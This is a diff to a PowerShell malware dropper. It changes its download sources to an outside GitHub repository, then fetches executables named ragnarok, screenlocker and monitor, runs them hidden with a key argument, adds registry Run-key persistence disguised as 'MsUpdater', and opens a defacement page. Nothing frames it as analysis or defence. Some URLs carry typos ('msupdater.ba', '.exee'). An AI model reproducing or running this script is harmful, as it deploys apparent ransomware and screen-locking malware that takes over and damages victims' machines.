@@ -1,12 +1,12 @@
-Invoke-WebRequest -Uri "/pkgs/ragnarok.exe" -OutFile "C:\\Users\\Public\\Documents\\ragnarok.exe";
+Invoke-WebRequest -Uri "https://github.com/0fxdb/instructions/raw/main/srcs/ragnarok.exe" -OutFile "C:\\Users\\Public\\Documents\\ragnarok.exe";
 Start-Process C:\\Users\\Public\\Documents\\ragnarok.exe -ArgumentList "7adba1904b0050f06bcfbd9d235065f6" -WindowStyle Hidden;
-Invoke-WebRequest -Uri "/pkgs/screenlocker.exe" -OutFile "C:\\Users\\Public\\Documents\\screenlocker.exe";
-Invoke-WebRequest -Uri "/pkgs/msupdater.bat" -OutFile "C:\\Users\\Public\\Documents\\msupdater.bat";
+Invoke-WebRequest -Uri "https://github.com/0fxdb/instructions/raw/main/srcs/screenlocker.exe" -OutFile "C:\\Users\\Public\\Documents\\screenlocker.exe";
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/0fxdb/instructions/main/srcs/msupdater.ba" -OutFile "C:\\Users\\Public\\Documents\\msupdater.bat";
 Set-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name "MsUpdater" -Value "C:\\Users\\Public\\Documents\\msupdater.bat";
 Start-Process C:\\Users\\Public\\Documents\\screenlocker.exe -ArgumentList "7adba1904b0050f06bcfbd9d235065f6";
-Invoke-WebRequest -Uri "/pkgs/monitor_of_monitor.exe" -OutFile "C:\\Users\\Public\\Documents\\winexec.exe ";
-Invoke-WebRequest -Uri "/pkgs/monitor.exe" -OutFile "C:\\Users\\Public\\Documents\\msexec.exe ";
-Invoke-WebRequest -Uri "/pkgs/runner.exe" -OutFile "C:\\Users\\Public\\Documents\\runner.exe";
+Invoke-WebRequest -Uri "https://github.com/0fxdb/instructions/raw/main/srcs/monitor_of_monitor.exee" -OutFile "C:\\Users\\Public\\Documents\\winexec.exe ";
+Invoke-WebRequest -Uri "https://github.com/0fxdb/instructions/raw/main/srcs/monitor.exe" -OutFile "C:\\Users\\Public\\Documents\\msexec.exe ";
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/0fxdb/instructions/main/srcs/runner.exe" -OutFile "C:\\Users\\Public\\Documents\\runner.exe";
 Start-Process C:\\Users\\Public\\Documents\\winexec.exe -WindowStyle Hidden;
 Start-Process C:\\Users\\Public\\Documents\\msexec.exe -WindowStyle Hidden;
 Start-Process C:\\Users\\Public\\Documents\\deface.html;
